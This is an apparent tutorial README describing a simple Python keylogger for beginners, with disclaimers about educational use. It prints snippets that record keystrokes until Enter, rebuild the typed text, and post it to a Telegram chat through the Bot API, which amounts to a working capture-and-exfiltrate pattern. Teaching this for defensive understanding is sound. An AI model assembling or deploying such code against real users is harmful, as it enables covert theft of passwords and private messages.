# Basic Keylogger (Educational Demonstration)

A **keylogger** is a program that records keyboard input. While the term is often associated with malware, the underlying concept is simply monitoring keyboard events. Similar techniques are also used in legitimate software such as accessibility tools, automation utilities, input testing, and security research.

This example is created **strictly for educational purposes** to help beginners understand the basic idea behind how a keylogger works. It is **not** intended to encourage unauthorized monitoring or misuse. Always test code like this only on systems you own or where you have explicit permission.

At its most basic level, a keylogger has **two main parts**:

### 1. Capturing Keyboard Input

The first part listens for keyboard events and records the keys that the user presses. In this example, the program uses the `keyboard` library to monitor keystrokes. It collects the typed characters until the **Enter** key is pressed, while also handling special keys such as **Space** and **Backspace** to reconstruct the typed text.

### 2. Sending the Captured Data

Once the text has been collected, the second part sends it somewhere. In this demonstration, the captured text is sent to a Telegram chat using the Telegram Bot API through the `requests` library. This illustrates how recorded data can be transmitted over the internet.

Together, these two components represent the basic workflow of a simple keylogger:

**Capture Input → Process the Text → Send the Data**

Real-world malicious keyloggers are usually much more sophisticated. They may run silently in the background, record additional information such as the active application or timestamps, start automatically when the system boots, encrypt collected data, and use more advanced communication methods. This project intentionally avoids those features and focuses only on the core concepts so that beginners can understand the fundamentals before exploring more advanced topics in defensive cybersecurity and malware analysis.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## How This Basic Keylogger Works

A **keylogger** is a program that records keyboard input. In cybersecurity, understanding how a basic keylogger works helps explain how keystrokes can be captured and why protecting sensitive information is important.

This example demonstrates the basic idea using **two components**.

### 1. Capturing Keystrokes

The program records keyboard events until the **Enter** key is pressed.

```python
events = keyboard.record(until='enter')
```

Each recorded event is processed to rebuild the text typed by the user.

```python
if key == 'space':
    text += ' '
elif key == 'backspace':
    text = text[:-1]
elif len(key) == 1:
    text += key
```

At the end of this step, the variable `text` contains the user's input.

---

### 2. Sending the Data

After collecting the input, the program sends it to a Telegram chat using the Telegram Bot API.

```python
requests.post(
    f"https://api.telegram.org/bot{API_TOKEN}/sendMessage",
    data={
        "chat_id": CHAT_ID,
        "text": msg
    }
)
```

The complete workflow is:

```
Keyboard Input
      ↓
Capture Keystrokes
      ↓
Build the Typed Text
      ↓
Send to Telegram
```

This is the fundamental structure of a basic keylogger. More advanced keyloggers may record additional information, such as timestamps, active windows, or clipboard data, and may use different methods for storing or transmitting collected information. This example intentionally focuses only on the core concept to keep the implementation simple and easy to understand.

